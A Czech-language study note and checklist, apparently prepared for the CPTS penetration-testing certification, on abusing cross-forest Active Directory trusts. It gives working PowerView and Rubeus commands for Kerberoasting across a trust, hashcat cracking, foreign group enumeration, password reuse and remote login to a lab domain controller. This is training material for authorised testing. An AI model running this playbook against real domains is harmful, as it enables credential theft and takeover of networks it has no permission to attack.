# 📖 CPTS: Útoky na doménové vztahy (Trusts) – Cross-Forest Trust Abuse (Windows)

Při průniku do Active Directory prostředí s více doménovými lesy (Forests) je klíčové analyzovat směr a typ důvěry (Trust). Pokud existuje příchozí nebo obousměrná důvěra (Inbound / Bidirectional Forest Trust), lze z kompromitovaného lesa A získat přístup do cílového lesa B zneužitím servisních účtů, členství v cizích skupinách nebo opakovaného použití hesel.

## 🔍 Teoretický přehled technik

### 1. Cross-Forest Kerberoasting

- **Princip:** V prostředí s obousměrnou nebo příchozí důvěrou může uživatel z domény A požádat o TGS lístek pro servisní účet (s nastaveným SPN) z domény B.
    
- **Cíl:** Získat TGS hash účtu v cílové doméně (např. účet s právy `Domain Admins`), který lze následně crackovat offline v Hashcatu.
    

### 2. Password Reuse & Foreign Group Membership

- **Password Reuse:** Správci sítě často spravují více lesů současně. Pokud získáte heslo administrátora v doméně A, je vysoká pravděpodobnost, že stejné heslo nebo účet se stejnými kredenčními údaji existuje i v doméně B.
    
- **Foreign Group Membership (Cizí členství ve skupinách):** Ve Windows AD mohou pouze skupiny typu **Domain Local** obsahovat objekty (Security Principals) z cizího lesa. Pokud je například administrátor z domény A členem lokální skupiny `Administrators` v doméně B, kompromitace uživatele v doméně A automaticky uděluje administrativní přístup k doméně B.
    

### 3. Cross-Forest SID History Abuse

- **Princip:** Pokud proběhla migrace uživatele mezi lesy a na trustu **není aktivována filtrace SID (SID Filtering)**, atribut `sidHistory` si zachová SID s privilegovanými právy z původního lesa. Uživatel tak po autentizaci napříč lesem získá v cílovém lese oprávnění odpovídající zapsanému SID.
    

## 🛠️ Postup útoku krok za krokem

### Krok 1: Cross-Forest Kerberoasting

1. **Vyhledání servisních účtů (SPN) v cílové doméně:**
    
    ```
    Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select samaccountname
    ```
    
2. **Ověření oprávnění nalezeného účtu:**
    
    ```
    Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
    ```
    
3. **Získání TGS hashe pomocí Rubeus přes trust:**
    
    ```
    .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
    ```
    
4. **Crackování hashe (offline):**
    
    - Získaný hash spuste v Hashcatu (mód `13100` pro Kerberoast / RC4_HMAC).
        

### Krok 2: Detekce Foreign Group Memberships

1. **Vyhledání cizích členů v lokálních skupinách cílové domény:**
    
    ```
    Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
    ```
    
2. **Převod získaného SID na uživatelské jméno:**
    
    ```
    Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
    ```
    
    _(Výsledek např.: `INLANEFREIGHT\administrator`)_
    
3. **Testování přístupu přes WinRM / PowerShell Remoting:** Pokud má účet z domény A administrativní přístup v doméně B, připojte se pomocí `Enter-PSSession`:
    
    ```
    Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
    ```
    

# 📋 CPTS Checklist: Cross-Forest Trust Abuse (Windows)

### 🔲 Fáze 1: Enumerace cílového lesa / domény

- [ ] **Enumerace SPN účtů:** Spustit `Get-DomainUser -SPN -Domain <Target_Domain>` a vyhledat účty se servisními jmény.
    
- [ ] **Kontrola práv SPN účtů:** Zkontrolovat `memberof` u nalezených SPN účtů a ověřit, zda nejsou členy `Domain Admins`.
    

### 🔲 Fáze 2: Kerberoasting přes Trust

- [ ] **Kerberoast příkaz s parametrem /domain:**
    
    ```
    .\Rubeus.exe kerberoast /domain:<Target_Domain> /user:<Target_User> /nowrap
    ```
    
- [ ] **Crackování v Hashcatu:** Spustit offline crackování získaného TGS ticketu (mód `13100`).
    

### 🔲 Fáze 3: Enumerace Foreign Group Memberships & Password Reuse

- [ ] **Vyhledání cizích členů skupin:** Spustit `Get-DomainForeignGroupMember -Domain <Target_Domain>`.
    
- [ ] **Převod SID na jméno:** Ověřit uživatele přes `Convert-SidToName <SID>`.
    
- [ ] **Test Password Reuse:** Otestovat získané čisté textové údaje nebo NTLM hashe adminů z domény A vůči doméně B.
    
- [ ] **Ověření správy / přístupu:** Vyzkoušet připojení na DC cílové domény pomocí `Enter-PSSession` nebo `CrackMapExec/NetExec`.